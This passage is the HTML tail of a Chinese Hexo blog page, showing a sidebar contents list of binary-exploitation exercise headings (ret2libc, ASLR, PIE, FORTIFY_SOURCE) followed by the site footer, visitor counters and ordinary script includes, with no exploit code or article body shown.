href="#%E5%BC%80%E5%A7%8B%E8%A7%A3%E9%A2%98"><span class="nav-text">开始解题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#024-pwntools-shellcraft"><span class="nav-text">024 pwntools-shellcraft</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#025-%E5%BC%80%E5%90%AFNX%E4%BF%9D%E6%8A%A4-ret2libc"><span class="nav-text">025 开启NX保护+ret2libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#026-ASLR-0"><span class="nav-text">026 ASLR 0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#027-ASLR-0-1"><span class="nav-text">027 ASLR 0&#x2F;1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#028-ASLR-2"><span class="nav-text">028 ASLR 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#029-ASLR%E5%92%8CPIE%E9%83%BD%E5%BC%80%E5%90%AF"><span class="nav-text">029 ASLR和PIE都开启</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#030-PIE%E5%85%B3%E9%97%AD"><span class="nav-text">030 PIE关闭</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#031-ALSR%E5%92%8CPIE%E5%BC%80%E5%90%AF"><span class="nav-text">031 ALSR和PIE开启</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#032-FORTIFY-SOURCE-0"><span class="nav-text">032 FORTIFY_SOURCE&#x3D;0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#033-FORTIFY-SOURCE-1"><span class="nav-text">033 FORTIFY_SOURCE&#x3D;1</span></a></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2024</span> - 2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">bcmp</a><p class="post-count space-x-0.5"><span>共撰写了 105 篇文章 </span><span>共 373.9k 字</span></p></div><script data-swup-reload-script src="https://cn.v ercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">访问人数</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">总访问量</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span> <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span></div><div>博客已运行 <span class="odometer" id="runtime_days"></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="/js/libs/Swup.min.js"></script><script src="/js/libs/SwupSlideTheme.min.js"></script><script src="/js/libs/SwupScriptsPlugin.min.js"></script><script src="/js/libs/SwupProgressPlugin.min.js"></script><script src="/js/libs/SwupScrollPlugin.min.js"></script><script src="/js/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/tools/imageViewer.js" type="module"></script><script src="/js/utils.js" type="module"></script><script src="/js/main.js" type="module"></script><script src="/js/layouts/navbarShrink.js" type="module"></script><script src="/js/tools/scrollTopBottom.js" type="module"></script><script src="/js/tools/lightDarkSwitch.js" type="module"></script><script src="/js/layouts/categoryList.js" type="module"></script><script src="/js/tools/localSearch.js" type="module"></script><script src="/js/tools/codeBlock.js" type="module"></script><script src="/js/layouts/lazyload.js" type="module"></script><script src="/js/tools/runtime.js"></script><script src="/js/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/libs/Typed.min.js"></script><script src="/js/plugins/typed.js" type="module"></script><div class="post-scripts" data-swup-reload-script><script src="/js/tools/tocToggle.js" type="module"></script><script src="/js/layouts/toc.js" type="module"></script><script src="/js/plugins/tabs.js" type="module"></script></div><div id="aplayer"></div><script src="/js/libs/APlayer.min.js"></script><script src="/js/plugins/aplayer.js"></script></body></html>